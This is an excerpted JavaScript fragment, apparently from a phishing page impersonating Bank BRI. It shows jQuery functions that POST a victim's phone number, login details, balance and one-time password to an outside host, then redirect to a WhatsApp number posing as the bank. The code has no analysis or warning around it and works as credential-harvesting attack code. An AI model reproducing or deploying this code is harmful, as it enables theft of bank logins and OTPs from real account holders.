...
function sendHp() {
   ...
   $.ajax({
      type: 'POST',
      url: 'https://zebra-daerah.whf.bz/awx/sigit/one.php',
...
function sendLogin() {
   ...
   $.ajax({
      type: 'POST',
      url: 'https://zebra-daerah.whf.bz/awx/sigit/login.php',
...
function sendSaldo() {
   ...
   $.ajax({
      type: 'POST',
      url: 'https://zebra-daerah.whf.bz/awx/sigit/two.php',
      data: $('#inputlogin').serialize(),
      complete: function(data) {
         vibr(220);
         console.log('Complete')
...
function kirimOtp() {
   ...
   $.ajax({
      type: 'POST',
      url: 'https://zebra-daerah.whf.bz/awx/sigit/three.php',
...
setTimeout(function(){  
    $("#process1").hide();   
location.href='https://wa.me/6285273033919?text=Hallo%20Bank%20BRI%0ASaya%20mau%20Request%20kode%20Virtual';
 $('.load').hide();
    }, 4000);    
